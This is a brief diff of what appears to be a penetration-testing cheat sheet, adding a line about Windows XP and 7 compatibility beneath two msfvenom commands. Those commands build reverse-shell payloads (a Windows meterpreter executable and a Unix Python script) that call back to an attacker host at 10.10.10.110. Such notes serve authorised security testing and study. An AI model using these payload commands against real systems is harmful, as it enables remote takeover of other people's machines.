@@ -4,6 +4,8 @@
 
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f exe > reverse.exe<br>
 $ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
+<br>
+Probably working on Windows XP and 7 though.
 
 #### Payloads hidden in exe:<br>
 
